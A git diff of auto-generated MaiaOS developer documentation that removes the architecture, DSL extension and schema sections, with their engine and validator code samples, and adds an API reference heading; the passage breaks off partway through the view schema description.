@@ -1,6 +1,6 @@
 # MaiaOS Documentation for Developers
 
-**Auto-generated:** 2026-01-22T21:50:08.642Z
+**Auto-generated:** 2026-01-22T22:11:46.182Z
 **Purpose:** Complete context for LLM agents working with MaiaOS
 
 ---
@@ -1279,6568 +1279,82 @@ my-app/
 
 ---
 
-# 01_MAIAOS
+# MAIA SELF/API REFERENCE
 
-*Source: developers/01_maiaos.md*
+*Source: developers/01_maia-self/api-reference.md*
 
-# MaiaOS (Developer Guide)
+# API Reference
 
-**For developers** who want to understand and extend the MaiaOS architecture.
-
-## Architecture Overview
-
-MaiaOS is a **declarative operating system** for building AI-composable applications. It separates concerns into three distinct layers:
-
-### 1. Definition Layer (Declarative)
-User-facing configuration files (`.maia`):
-- **Actors** - Component identity and references
-- **State Machines** - Behavior flow
-- **Views** - UI structure
-- **Styles** - Appearance
-- **Skills** - AI agent interface
-
-### 2. Execution Layer (Imperative)
-JavaScript engines that interpret definitions:
-- **ActorEngine** - Actor lifecycle management
-- **StateEngine** - State machine interpreter
-- **ViewEngine** - View-to-DOM renderer
-- **ToolEngine** - Tool executor
-- **StyleEngine** - Style compiler
-- **ModuleRegistry** - Dynamic module loader
-
-### 3. Intelligence Layer (Orchestration)
-AI agent integration:
-- **SkillEngine** - Skill discovery and interpretation (v0.5)
-- **LLM Integration** - Event generation from natural language (v0.5)
-
-## Core Philosophy
-
-### Separation of Concerns
-
-```
-┌──────────────┐
-│   Actors     │  ← Pure configuration (JSON)
-└──────┬───────┘
-       │
-       ▼
-┌──────────────┐
-│   Engines    │  ← Execution machinery (JavaScript)
-└──────┬───────┘
-       │
-       ▼
-┌──────────────┐
-│    Tools     │  ← Imperative actions (JavaScript)
-└──────────────┘
-```
-
-### Zero Logic in Definitions
-
-Actors, views, and state machines are **pure data**:
-- No JavaScript functions
-- No embedded logic
-- Only references and configuration
-
-This enables:
-- ✅ Easy serialization (JSON)
-- ✅ AI generation/modification
-- ✅ Hot reload without code changes
-- ✅ Visual editing tools (future)
-
-## System Initialization
-
-### Boot Sequence
-
-```javascript
-// 1. Initialize kernel
-const os = await MaiaOS.boot({
-  modules: ['core', 'mutation', 'dragdrop']
-});
-
-// Behind the scenes:
-// → ModuleRegistry initialized
-// → Engines initialized (Actor, State, View, Tool, Style)
-// → Modules loaded dynamically
-// → Tools registered
-```
-
-### Kernel Structure
-
-```javascript
-class MaiaOS {
-  static async boot(config) {
-    const os = {
-      // Core registries
-      moduleRegistry: new ModuleRegistry(),
-      actors: new Map(),
-      
-      // Engines
-      actorEngine: null,
-      stateEngine: null,
-      viewEngine: null,
-      toolEngine: null,
-      styleEngine: null,
-      evaluator: null,
-      
-      // Public API
-      createActor: async (actorPath, container) => {...},
-      loadVibe: async (vibePath, container) => {...},
-      getActor: (actorId) => {...},
-      sendMessage: (actorId, message) => {...},
-      getEngines: () => {...}
-    };
-    
-    // Initialize engines
-    os.evaluator = new MaiaScriptEvaluator(os.moduleRegistry);
-    os.toolEngine = new ToolEngine(os.moduleRegistry);
-    os.stateEngine = new StateEngine(os.evaluator, os.toolEngine);
-    os.viewEngine = new ViewEngine(os.evaluator, os.stateEngine);
-    os.styleEngine = new StyleEngine(os.evaluator);
-    os.actorEngine = new ActorEngine(
-      os.stateEngine,
-      os.viewEngine,
-      os.styleEngine
-    );
-    
-    // Load modules
-    for (const moduleName of config.modules) {
-      await os.moduleRegistry.loadModule(moduleName);
-    }
-    
-    return os;
-  }
-}
-```
-
-## Vibes (App Manifests)
-
-### What Are Vibes?
-
-Vibes are marketplace-ready app manifests (`.vibe.maia`) that provide metadata and reference the root actor. They serve as the "app store listing" for MaiaOS applications.
-
-**Structure:**
-```json
-{
-  "$type": "vibe",
-  "$id": "vibe_todos_001",
-  "name": "Todo List",
-  "description": "A complete todo list application...",
-  "actor": "./todo.actor.maia"
-}
-```
-
-### Loading Vibes
-
-```javascript
-// High-level API (recommended)
-const { vibe, actor } = await os.loadVibe(
-  './vibes/todos/todos.vibe.maia',
-  document.getElementById('container')
-);
-
-// Equivalent to:
-// 1. Fetch vibe manifest
-// 2. Validate structure ($type, actor field)
-// 3. Resolve actor path (relative to vibe)
-// 4. Call os.createActor(resolvedPath, container)
-// 5. Return {vibe, actor}
-```
-
-### Implementation
-
-**kernel.js:**
-```javascript
-async loadVibe(vibePath, container) {
-  // Fetch vibe manifest
-  const response = await fetch(vibePath);
-  const vibe = await response.json();
-  
-  // Validate
-  if (vibe.$type !== 'vibe') {
-    throw new Error('Invalid vibe manifest: $type must be "vibe"');
-  }
-  if (!vibe.actor) {
-    throw new Error('Vibe manifest missing "actor" field');
-  }
-  
-  // Resolve actor path relative to vibe location
-  const vibeDir = vibePath.substring(0, vibePath.lastIndexOf('/'));
-  const actorPath = `${vibeDir}/${vibe.actor}`;
-  
-  // Create actor
-  const actor = await this.createActor(actorPath, container);
-  
-  return { vibe, actor };
-}
-```
-
-### Design Rationale
-
-**Why separate vibes from actors?**
-
-1. **Marketplace Integration** - Vibes provide metadata for discovery, search, and installation
-2. **Clean Separation** - Manifest (vibe) vs Implementation (actor)
-3. **Extensibility** - Easy to add icon, screenshots, version, etc. without changing actors
-4. **AI-Friendly** - LLMs can generate vibe manifests as app packaging
-
-**Future Extensions:**
-```json
-{
-  "$type": "vibe",
-  "name": "...",
-  "description": "...",
-  "actor": "...",
-  "icon": "./icon.svg",          // Marketplace icon
-  "screenshots": ["..."],         // Preview images
-  "tags": ["productivity"],       // Search tags
-  "category": "productivity",     // Primary category
-  "license": "MIT",               // License type
-  "repository": "https://..."     // Source URL
-}
-```
-
-## Actor Lifecycle
-
-### 1. Creation
-
-```javascript
-const actor = await os.createActor(
-  './maia/todo.actor.maia',
-  document.getElementById('container')
-);
-
-// Behind the scenes:
-// 1. Load actor.maia (JSON)
-// 2. Load referenced state.maia
-// 3. Load referenced view.maia (if present)
-// 4. Load referenced style.maia (if present)
-// 5. Initialize state machine
-// 6. Render view to Shadow DOM
-// 7. Apply styles
-// 8. Return actor instance
-```
-
-### 2. Actor Instance Structure
-
-```javascript
-{
-  id: 'actor_todo_001',
-  context: {
-    todos: [],
-    newTodoText: '',
-    // ... runtime state
-  },
-  machine: {
-    id: 'state_todo_001',
-    currentState: 'idle',
-    definition: {...},
-    // ... state machine instance
-  },
-  container: HTMLElement,        // DOM mount point
-  viewDef: {...},                // View definition
-  styleDef: {...},               // Style definition
-  inbox: [],                     // Message queue
-  subscriptions: [],             // Actor subscriptions
-  inboxWatermark: 0,             // Last processed message
-  actorEngine: ActorEngine,      // Reference to engine
-}
-```
-
-### 3. Event Flow
-
-```
-User Interaction (click, input, etc.)
-  ↓
-ViewEngine captures event
-  ↓
-ViewEngine.evaluatePayload() (resolve $ and $$)
-  ↓
-StateEngine.send(machineId, eventName, payload)
-  ↓
-StateEngine finds current state
-  ↓
-StateEngine checks event handlers (on: {...})
-  ↓
-StateEngine evaluates guard (if present)
-  ↓
-Guard passes → Continue
-Guard fails → Ignore event
-  ↓
-StateEngine executes exit actions (if leaving state)
-  ↓
-StateEngine transitions to target state
-  ↓
-StateEngine executes entry actions (tool invocations)
-  ↓
-ToolEngine.execute(toolName, actor, payload)
-  ↓
-Tool mutates actor.context
-  ↓
-Tool succeeds → StateEngine sends SUCCESS event
-Tool fails → StateEngine sends ERROR event
-  ↓
-StateEngine handles SUCCESS/ERROR transition
-  ↓
-ActorEngine.rerender(actor)
-  ↓
-ViewEngine re-renders Shadow DOM
-  ↓
-User sees updated UI
-```
-
-## Engine Architecture
-
-### ActorEngine
-
-**Responsibilities:**
-- Actor creation and registration
-- Actor lifecycle management
-- Re-rendering orchestration
-- Message passing coordination
-
-**Key Methods:**
-```javascript
-class ActorEngine {
-  async createActor(actorPath, container, os)
-  registerActor(actor)
-  getActor(actorId)
-  async rerender(actor)
-  destroyActor(actorId)
-  sendMessage(actorId, message)
-  processMessages(actor)
-}
-```
-
-### StateEngine
-
-**Responsibilities:**
-- State machine interpretation
-- Event handling
-- Guard evaluation
-- Tool invocation
-- Automatic SUCCESS/ERROR events
-
-**Key Methods:**
-```javascript
-class StateEngine {
-  registerMachine(machineId, definition, initialContext)
-  send(machineId, event, payload)
-  getCurrentState(machineId)
-  async transition(machineId, event, payload)
-  _evaluateGuard(guard, context, eventPayload)
-  _evaluatePayload(payload, context, eventPayload)
-  async _invokeTool(tool, actor)
-}
-```
-
-### ViewEngine
-
-**Responsibilities:**
-- View definition to DOM rendering
-- Event listener attachment
-- Payload evaluation
-- Shadow DOM management
-
-**Key Methods:**
-```javascript
-class ViewEngine {
-  render(container, viewDef, actor, actorEngine)
-  _renderElement(elementDef, context, actorEngine, actor)
-  _attachEventListeners(element, events, actor, actorEngine)
-  _evaluatePayload(payload, context, item, element)
-}
-```
-
-### ToolEngine
-
-**Responsibilities:**
-- Tool registration
-- Tool execution
-- Tool definition loading
-- Error handling
-
-**Key Methods:**
-```javascript
-class ToolEngine {
-  async registerTool(toolPath, toolName)
-  async execute(toolName, actor, payload)
-  async loadToolDefinition(toolPath)
-  async loadToolFunction(toolPath)
-}
-```
-
-### StyleEngine
-
-**Responsibilities:**
-- Style compilation
-- Token to CSS custom property conversion
-- CSS injection into Shadow DOM
-
-**Key Methods:**
-```javascript
-class StyleEngine {
-  compile(styleDef)
-  _compileTokens(tokens)
-  _compileStyles(styles)
-}
-```
-
-### ModuleRegistry
-
-**Responsibilities:**
-- Module registration
-- Dynamic module loading
-- Module metadata management
-
-**Key Methods:**
-```javascript
-class ModuleRegistry {
-  registerModule(name, moduleClass, metadata)
-  async loadModule(moduleName, modulePath)
-  getModule(name)
-  hasModule(name)
-  listModules()
-  setToolEngine(toolEngine)
-}
-```
-
-## Module System
-
-### Module Structure
-
-```javascript
-// o/modules/custom.module.js
-export class CustomModule {
-  static async register(registry, toolEngine) {
-    // Register tools
-    await toolEngine.registerTool('custom/doSomething', '@custom/doSomething');
-    await toolEngine.registerTool('custom/doOther', '@custom/doOther');
-    
-    // Register module metadata
-    registry.registerModule('custom', CustomModule, {
-      version: '1.0.0',
-      description: 'Custom functionality module',
-      namespace: '@custom',
-      tools: ['@custom/doSomething', '@custom/doOther']
-    });
-  }
-}
-
-// Export register function (alternative pattern)
-export async function register(registry) {
-  const toolEngine = registry._toolEngine;
-  await CustomModule.register(registry, toolEngine);
-}
-```
-
-### Tool Structure
-
-Two files per tool:
-
-1. **Tool Definition** (`*.tool.maia`) - AI-compatible metadata:
-```json
-{
-  "$type": "tool",
-  "$id": "tool_custom_001",
-  "name": "@custom/doSomething",
-  "description": "Does something useful",
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "param1": {"type": "string", "required": true}
-    }
-  }
-}
-```
-
-2. **Tool Function** (`*.tool.js`) - Executable code:
-```javascript
-export default {
-  async execute(actor, payload) {
-    const { param1 } = payload;
-    // Mutate actor.context
-    actor.context.someField = param1;
-    console.log('✅ Did something:', param1);
-  }
-};
-```
-
-## Extending MaiaOS
-
-### Adding a New Engine
-
-1. Create engine class:
-```javascript
-// o/engines/ThreeJSEngine.js
-export class ThreeJSEngine {
-  constructor(evaluator) {
-    this.evaluator = evaluator;
-    this.scenes = new Map();
-  }
-  
-  createScene(actor, sceneDef) {
-    // Initialize Three.js scene
-  }
-  
-  render(sceneId) {
-    // Render Three.js scene
-  }
-}
-```
-
-2. Register in kernel:
-```javascript
-os.threeEngine = new ThreeJSEngine(os.evaluator);
-```
-
-3. Update actor definition schema:
-```json
-{
-  "$type": "actor",
-  "sceneRef": "myScene",  // ← New reference type
-  "viewRef": "myView"
-}
-```
-
-### Adding a New DSL Type
-
-1. Define DSL schema:
-```json
-{
-  "$type": "animation",
-  "$id": "anim_001",
-  "keyframes": {
-    "0%": {"opacity": 0},
-    "100%": {"opacity": 1}
-  },
-  "duration": "300ms",
-  "easing": "ease-out"
-}
-```
-
-2. Create engine/compiler:
-```javascript
-class AnimationEngine {
-  compile(animDef) {
-    // Convert to CSS animations or Web Animations API
-  }
-}
-```
-
-3. Integrate with actors:
-```json
-{
-  "$type": "actor",
-  "animationRef": "fadeIn"
-}
-```
-
-## Best Practices
-
-### ✅ DO:
-
-- **Keep engines stateless** - State lives in actors
-- **Use dependency injection** - Pass engines/registries as params
-- **Validate inputs** - Check payloads and definitions
-- **Log operations** - Help debugging
-- **Handle errors gracefully** - Don't crash the system
-- **Document public APIs** - Clear JSDoc comments
-
-### ❌ DON'T:
-
-- **Don't store actor state in engines** - Use `actor.context`
-- **Don't mutate definitions** - Treat as immutable
-- **Don't hardcode paths** - Use relative imports
-- **Don't bypass engines** - Use proper APIs
-- **Don't create global singletons** - Pass instances
-
-## Debugging
-
-```javascript
-// Expose OS globally
-window.os = os;
-window.engines = os.getEngines();
-
-// Inspect actor
-const actor = os.getActor('actor_todo_001');
-console.log(actor.context);
-console.log(actor.machine.currentState);
-
-// Monitor events
-const originalSend = os.stateEngine.send;
-os.stateEngine.send = function(machineId, event, payload) {
-  console.log('Event:', event, payload);
-  return originalSend.call(this, machineId, event, payload);
-};
-
-// Monitor rerenders
-const originalRerender = os.actorEngine.rerender;
-os.actorEngine.rerender = function(actor) {
-  console.log('Rerender:', actor.id);
-  return originalRerender.call(this, actor);
-};
-```
-
-## Next Steps
-
-- Read [Engines Guide](./engines.md) - Creating custom engines
-- Read [Tools Guide](./tools.md) - Creating tool modules
-- Read [DSL Guide](./dsl.md) - Extending DSL types
+Complete API reference for `@MaiaOS/self` package.
 
 ---
 
-# 02_DSL
-
-*Source: developers/02_dsl.md*
-
-# DSL Guide (Developer)
-
-**For developers** who want to extend MaiaScript DSL with new definition types and expression syntax.
-
-## What is MaiaScript DSL?
-
-**MaiaScript** is a declarative JSON-based language for defining actors, state machines, views, styles, tools, and skills. It's designed to be:
-
-- ✅ **Human-readable** - JSON with clear semantics
-- ✅ **AI-compatible** - LLMs can read and generate it
-- ✅ **Schema-validated** - Type-safe definitions validated against JSON Schema
-- ✅ **Expression-rich** - Context references (`$`), item references (`$$`)
-
-All MaiaScript files are automatically validated against JSON schemas when loaded. See [Schema System](./schemas.md) for details.
-
-## DSL Types
-
-### Core DSL Types
-
-| Type | File Extension | Purpose | Engine |
-|------|----------------|---------|--------|
-| `actor` | `.actor.maia` | Actor definition | ActorEngine |
-| `state` | `.state.maia` | State machine | StateEngine |
-| `view` | `.view.maia` | UI structure | ViewEngine |
-| `style` | `.style.maia` | Styling | StyleEngine |
-| `tool` | `.tool.maia` | Tool metadata | ToolEngine |
-| `skill` | `.skill.maia` | AI interface | SkillEngine (v0.5) |
-
-## Expression Syntax
-
-### Context References (`$`)
-
-Access actor context fields:
-
-```json
-{
-  "text": "$newTodoText",
-  "mode": "$viewMode",
-  "count": "$todos.length"
-}
-```
-
-Evaluated by `MaiaScriptEvaluator`:
-
-```javascript
-evaluate(expression, data) {
-  if (typeof expression === 'string' && expression.startsWith('$')) {
-    const path = expression.slice(1);
-    return this._resolvePath(data.context, path);
-  }
-  return expression;
-}
-```
-
-### Item References (`$$`)
-
-Access current item in `for` loops:
-
-```json
-{
-  "for": "$todos",
-  "forItem": "todo",
-  "children": [
-    {
-      "text": "$$text",
-      "data-id": "$$id"
-    }
-  ]
-}
-```
-
-### Special Event References (`@`)
-
-Access DOM event values:
-
-```json
-{
-  "on": {
-    "input": {
-      "send": "UPDATE_INPUT",
-      "payload": {
-        "value": "@inputValue",     // input.value
-        "checked": "@checked",       // input.checked
-        "selectedValue": "@selectedValue"  // select.value
-      }
-    }
-  }
-}
-```
-
-## Creating a New DSL Type
-
-### Example: Animation DSL
-
-**Goal:** Define animations that can be applied to actors.
-
-#### 1. Define DSL Schema
-
-```json
-{
-  "$type": "animation",
-  "$id": "anim_fade_in_001",
-  "name": "fadeIn",
-  
-  "keyframes": {
-    "0%": {
-      "opacity": "0",
-      "transform": "translateY(-10px)"
-    },
-    "100%": {
-      "opacity": "1",
-      "transform": "translateY(0)"
-    }
-  },
-  
-  "duration": "300ms",
-  "easing": "ease-out",
-  "fillMode": "forwards",
-  
-  "triggers": {
-    "onEnter": true,
-    "onStateChange": ["creating", "updating"]
-  }
-}
-```
-
-#### 2. Create Engine/Compiler
-
-```javascript
-// o/engines/AnimationEngine.js
-export class AnimationEngine {
-  constructor(evaluator) {
-    this.evaluator = evaluator;
-    this.animations = new Map();
-    this.activeAnimations = new Map();
-  }
-  
-  /**
-   * Register animation definition
-   */
-  registerAnimation(animDef) {
-    if (animDef.$type !== 'animation') {
-      throw new Error('Invalid animation definition');
-    }
-    
-    // Compile to CSS animation
-    const css = this._compileToCSS(animDef);
-    
-    this.animations.set(animDef.$id, {
-      definition: animDef,
-      css,
-      name: animDef.name
-    });
-    
-    console.log(`✅ Registered animation: ${animDef.name}`);
-  }
-  
-  /**
-   * Apply animation to actor
-   */
-  applyAnimation(actor, animationId, target = 'root') {
-    const animation = this.animations.get(animationId);
-    if (!animation) {
-      throw new Error(`Animation not found: ${animationId}`);
-    }
-    
-    // Inject CSS into actor's Shadow DOM
-    const shadowRoot = actor.container.shadowRoot;
-    if (!shadowRoot) return;
-    
-    let styleElement = shadowRoot.querySelector('style[data-animations]');
-    if (!styleElement) {
-      styleElement = document.createElement('style');
-      styleElement.setAttribute('data-animations', '');
-      shadowRoot.appendChild(styleElement);
-    }
-    
-    styleElement.textContent += animation.css;
-    
-    // Apply animation class to target element
-    const targetElement = target === 'root'
-      ? shadowRoot.querySelector(':host > *')
-      : shadowRoot.querySelector(target);
-    
-    if (targetElement) {
-      targetElement.style.animation = `${animation.name} ${animation.definition.duration} ${animation.definition.easing} ${animation.definition.fillMode}`;
-      
-      // Track active animation
-      this.activeAnimations.set(`${actor.id}_${target}`, {
-        actor,
-        animation: animation.name,
-        element: targetElement
-      });
-      
-      // Remove after animation completes
-      const duration = parseFloat(animation.definition.duration);
-      setTimeout(() => {
-        this.activeAnimations.delete(`${actor.id}_${target}`);
-      }, duration);
-    }
-  }
-  
-  /**
-   * Compile keyframes to CSS
-   */
-  _compileToCSS(animDef) {
-    let css = `@keyframes ${animDef.name} {\n`;
-    
-    for (const [offset, props] of Object.entries(animDef.keyframes)) {
-      css += `  ${offset} {\n`;
-      for (const [prop, value] of Object.entries(props)) {
-        const cssProperty = prop.replace(/([A-Z])/g, '-$1').toLowerCase();
-        css += `    ${cssProperty}: ${value};\n`;
-      }
-      css += `  }\n`;
-    }
-    
-    css += `}\n`;
-    return css;
-  }
-  
-  /**
-   * Cleanup
-   */
-  destroyActorAnimations(actorId) {
-    for (const [key, data] of this.activeAnimations) {
-      if (key.startsWith(`${actorId}_`)) {
-        data.element.style.animation = 'none';
-        this.activeAnimations.delete(key);
-      }
-    }
-  }
-}
-```
-
-#### 3. Integrate with Kernel
-
-```javascript
-// o/kernel.js
-import { AnimationEngine } from './engines/AnimationEngine.js';
-
-export class MaiaOS {
-  static async boot(config) {
-    const os = {...};
-    
-    // Initialize animation engine
-    os.animationEngine = new AnimationEngine(os.evaluator);
-    
-    return os;
-  }
-}
-```
-
-#### 4. Load Animations
-
-```javascript
-// o/engines/ActorEngine.js
-async createActor(actorPath, container, os) {
-  // ... load actor definition ...
-  
-  // Load animations if present
-  if (actorDef.animationRefs) {
-    for (const animRef of actorDef.animationRefs) {
-      const animPath = `${basePath}/${animRef}.animation.maia`;
-      const animDef = await this._loadJSON(animPath);
-      os.animationEngine.registerAnimation(animDef);
-      
-      // Apply on enter if configured
-      if (animDef.triggers?.onEnter) {
-        os.animationEngine.applyAnimation(actor, animDef.$id);
-      }
-    }
-  }
-  
-  // ... rest of actor creation ...
-}
-```
-
-#### 5. Hook into State Changes
-
-```javascript
-// o/engines/StateEngine.js
-async transition(machineId, event, payload) {
-  // ... existing transition logic ...
-  
-  // Trigger animations on state change
-  const machine = this.machines.get(machineId);
-  const actor = this._getActorForMachine(machineId);
-  
-  if (actor && actor.animationRefs) {
-    for (const animRef of actor.animationRefs) {
-      const animDef = this.os.animationEngine.animations.get(animRef);
-      if (animDef?.definition.triggers?.onStateChange?.includes(machine.currentState)) {
-        this.os.animationEngine.applyAnimation(actor, animRef);
-      }
-    }
-  }
-}
-```
-
-#### 6. Usage
-
-**`animations/fadeIn.animation.maia`:**
-```json
-{
-  "$type": "animation",
-  "$id": "anim_fade_in",
-  "name": "fadeIn",
-  "keyframes": {
-    "0%": {"opacity": "0", "transform": "translateY(-10px)"},
-    "100%": {"opacity": "1", "transform": "translateY(0)"}
-  },
-  "duration": "300ms",
-  "easing": "ease-out",
-  "fillMode": "forwards",
-  "triggers": {
-    "onEnter": true,
-    "onStateChange": ["creating"]
-  }
-}
-```
-
-**`todo.actor.maia`:**
-```json
-{
-  "$type": "actor",
-  "id": "actor_todo_001",
-  "stateRef": "todo",
-  "viewRef": "todo",
-  "animationRefs": ["fadeIn"],  // ← Load animation
-  "context": {...}
-}
-```
-
-## Extending Expression Syntax
-
-### Adding Custom Operators
-
-**Goal:** Add `#` prefix for computed properties.
-
-#### 1. Update Evaluator
-
-```javascript
-// o/engines/MaiaScriptEvaluator.js
-evaluate(expression, data = {}) {
-  // Existing: $ for context
-  if (typeof expression === 'string' && expression.startsWith('$')) {
-    const path = expression.slice(1);
-    return this._resolvePath(data.context || {}, path);
-  }
-  
-  // Existing: $$ for item
-  if (typeof expression === 'string' && expression.startsWith('$$')) {
-    const path = expression.slice(2);
-    return this._resolvePath(data.item || {}, path);
-  }
-  
-  // NEW: # for computed properties
-  if (typeof expression === 'string' && expression.startsWith('#')) {
-    const computedName = expression.slice(1);
-    return this._evaluateComputed(computedName, data.context);
-  }
-  
-  // ... rest of evaluation ...
-}
-
-_evaluateComputed(name, context) {
-  // Define computed properties
-  const computed = {
-    todosCount: () => context.todos?.length || 0,
-    completedCount: () => context.todos?.filter(t => t.done).length || 0,
-    progressPercent: () => {
-      const total = context.todos?.length || 0;
-      const completed = context.todos?.filter(t => t.done).length || 0;
-      return total > 0 ? Math.round((completed / total) * 100) : 0;
-    },
-    now: () => Date.now(),
-    today: () => new Date().toISOString().split('T')[0]
-  };
-  
-  if (computed[name]) {
-    return computed[name]();
-  }
-  
-  throw new Error(`Unknown computed property: ${name}`);
-}
-```
-
-#### 2. Usage
-
-```json
-{
-  "tag": "p",
-  "text": "You've completed #progressPercent% of your tasks"
-}
-
-{
-  "tag": "span",
-  "text": "#todosCount tasks remaining"
-}
-
-{
-  "tag": "input",
-  "attrs": {
-    "value": "#today"
-  }
-}
-```
-
-### Adding Custom Guards
-
-**Goal:** Add `$between` guard operator.
-
-```javascript
-// o/engines/StateEngine.js
-_evaluateGuard(guard, context, eventPayload = {}) {
-  // ... existing operators ...
-  
-  // NEW: $between operator
-  if (guard.$between) {
-    const [value, min, max] = guard.$between;
-    const val = this.evaluator.evaluate(value, { context, item: eventPayload });
-    const minVal = this.evaluator.evaluate(min, { context, item: eventPayload });
-    const maxVal = this.evaluator.evaluate(max, { context, item: eventPayload });
-    return val >= minVal && val <= maxVal;
-  }
-  
-  // ... rest of guards ...
-}
-```
-
-Usage:
-```json
-{
-  "guard": {
-    "$between": ["$age", 18, 65]
-  }
-}
-```
-
-## DSL Validation
-
-### Schema Validation
-
-```javascript
-// o/validators/ActorValidator.js
-export class ActorValidator {
-  static validate(actorDef) {
-    const errors = [];
-    
-    // Check required fields
-    if (actorDef.$type !== 'actor') {
-      errors.push('$type must be "actor"');
-    }
-    
-    if (!actorDef.$id) {
-      errors.push('$id is required');
-    }
-    
-    if (!actorDef.id) {
-      errors.push('id is required');
-    }
-    
-    if (!actorDef.stateRef) {
-      errors.push('stateRef is required');
-    }
-    
-    if (!actorDef.context || typeof actorDef.context !== 'object') {
-      errors.push('context must be an object');
-    }
-    
-    // Check references
-    if (actorDef.viewRef && typeof actorDef.viewRef !== 'string') {
-      errors.push('viewRef must be a string');
-    }
-    
-    if (actorDef.styleRef && typeof actorDef.styleRef !== 'string') {
-      errors.push('styleRef must be a string');
-    }
-    
-    if (errors.length > 0) {
-      throw new Error(`Actor validation failed:\n${errors.join('\n')}`);
-    }
-    
-    return true;
-  }
-}
-```
-
-### Runtime Validation
-
-```javascript
-// o/engines/ActorEngine.js
-async createActor(actorPath, container, os) {
-  const actorDef = await this._loadJSON(actorPath);
-  
-  // Validate before creating
-  ActorValidator.validate(actorDef);
-  
-  // ... rest of actor creation ...
-}
-```
-
-## DSL Best Practices
-
-### ✅ DO:
-
-- **Use JSON schemas** - Validate structure
-- **Namespace types** - Use `$type` consistently
-- **Document fields** - Add `description` properties
-- **Version definitions** - Include version field
-- **Keep declarative** - No functions or logic
-- **Support expressions** - Use `$`, `$$`, `@` where appropriate
-
-### ❌ DON'T:
-
-- **Don't embed logic** - Keep definitions pure data
-- **Don't use functions** - Not JSON-serializable
-- **Don't create circular refs** - Will break serialization
-- **Don't hardcode values** - Use context references
-- **Don't skip validation** - Always validate inputs
-
-## DSL Transformation
-
-### Preprocessing DSL
-
-```javascript
-// o/transformers/DSLPreprocessor.js
-export class DSLPreprocessor {
-  /**
-   * Transform shorthand syntax to full syntax
-   */
-  static transform(dsl) {
-    if (dsl.$type === 'view') {
-      return this._transformView(dsl);
-    }
-    if (dsl.$type === 'state') {
-      return this._transformState(dsl);
-    }
-    return dsl;
-  }
-  
-  static _transformView(viewDef) {
-    // Transform shorthand: "text": "Hello" → "text": {"$eval": "Hello"}
-    // (Example: add metadata for debugging)
-    return this._transformElement(viewDef.root);
-  }
-  
-  static _transformElement(element) {
-    if (!element) return element;
-    
-    // Add source tracking
-    element._source = {
-      file: element.$source || 'unknown',
-      line: element.$line || 0
-    };
-    
-    // Transform children recursively
-    if (element.children) {
-      element.children = element.children.map(c => this._transformElement(c));
-    }
-    
-    return element;
-  }
-}
-```
-
-### Compiling DSL to Another Format
-
-```javascript
-// o/compilers/ViewToReact.js
-export class ViewToReact {
-  /**
-   * Compile MaiaScript view to React JSX
-   */
-  static compile(viewDef) {
-    return this._compileElement(viewDef.root);
-  }
-  
-  static _compileElement(element) {
-    const { tag, attrs, text, children } = element;
-    
-    let jsx = `<${tag}`;
-    
-    // Add attributes
-    if (attrs) {
-      for (const [key, value] of Object.entries(attrs)) {
-        jsx += ` ${key}="${value}"`;
-      }
-    }
-    
-    jsx += '>';
-    
-    // Add text
-    if (text) {
-      jsx += text;
-    }
-    
-    // Add children
-    if (children) {
-      jsx += children.map(c => this._compileElement(c)).join('\n');
-    }
-    
-    jsx += `</${tag}>`;
-    
-    return jsx;
-  }
-}
-```
-
-## Next Steps
-
-- Read [Engines Guide](./engines.md) - Creating custom engines
-- Read [Tools Guide](./tools.md) - Creating tool modules
-- Read [MaiaOS Guide](./maiaos.md) - Understanding the system
-- Explore [VIBE Docs](../vibe/) - User-facing documentation
-
----
-
-# 03_SCHEMAS
-
-*Source: developers/03_schemas.md*
-
-# JSON Schema System
-
-MaiaOS uses a centralized JSON Schema validation system to ensure all `.maia` files conform to their expected structure. This provides:
-
-- **Runtime validation** - Catch malformed data early
-- **Clear error messages** - Know exactly what's wrong and where
-- **Type safety** - Consistent data structures across the system
-- **Documentation** - Schemas serve as authoritative documentation
-
-## Overview
-
-All schemas are located in `src/schemata/` and use JSON Schema Draft 2020-12. The validation engine uses AJV for fast, cached validation.
-
-## Validation Engine
-
-The `ValidationEngine` class provides a unified API for validating all MaiaOS data types:
-
-```javascript
-import { ValidationEngine, getSchema } from '../schemata/index.js';
-
-const engine = new ValidationEngine();
-
-// Load a schema
-const actorSchema = getSchema('actor');
-engine.loadSchema('actor', actorSchema);
-
-// Validate data
-const result = engine.validate('actor', actorData);
-if (!result.valid) {
-  console.error('Validation errors:', result.errors);
-}
-```
-
-## Using Validation Helper
-
-For most use cases, use the validation helper which automatically loads all schemas:
-
-```javascript
-import { validateOrThrow } from '../schemata/validation.helper.js';
-
-// Validate and throw on error
-try {
-  validateOrThrow('actor', actorData, 'path/to/actor.maia');
-} catch (error) {
-  console.error('Validation failed:', error.message);
-}
-```
-
-## Schema Types
-
-### Actor Schema
-
-Validates actor definitions (`.actor.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"actor"`
-- `$id`: Unique identifier (pattern: `^actor_`)
-
-**Optional fields:**
-- `contextRef`, `stateRef`, `viewRef`, `interfaceRef`, `brandRef`, `styleRef`
-- `children`: Object mapping child names to actor IDs
-- `subscriptions`: Array of actor IDs to receive messages from
-- `inbox`: Array of messages
-- `inboxWatermark`: Number (default: 0)
-
-**Example:**
-```json
-{
-  "$type": "actor",
-  "$id": "actor_todo_001",
-  "contextRef": "todo",
-  "viewRef": "todo",
-  "stateRef": "todo"
-}
-```
-
-### Context Schema
-
-Validates context definitions (`.context.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"context"`
-- `$id`: Unique identifier (pattern: `^context_`)
-
-**Additional properties:** Any additional fields are allowed (flexible structure).
-
-**Example:**
-```json
-{
-  "$type": "context",
-  "$id": "context_todo_001",
-  "todos": [],
-  "newTodoText": ""
-}
-```
-
-### State Schema
-
-Validates state machine definitions (`.state.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"state"`
-- `$id`: Unique identifier (pattern: `^state_`)
-- `initial`: Initial state name
-- `states`: Object mapping state names to state definitions
-
-**State definition properties:**
-- `entry`: Action or array of actions to execute on entry
-- `exit`: Action or array of actions to execute on exit
-- `on`: Object mapping event names to transitions
-
-**Example:**
-```json
-{
-  "$type": "state",
-  "$id": "state_todo_001",
-  "initial": "idle",
-  "states": {
-    "idle": {
-      "on": {
-        "CREATE_TODO": "creating"
-      }
-    }
-  }
-}
-```
-
-### View Schema
-
-Validates view definitions (`.view.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"view"`
-- `$id`: Unique identifier (pattern: `^co_view_`)
-
-**Properties:**
-- `root`: Root DOM node (for leaf views)
-- `container`: Container node (for composite views)
-
-**View node properties:**
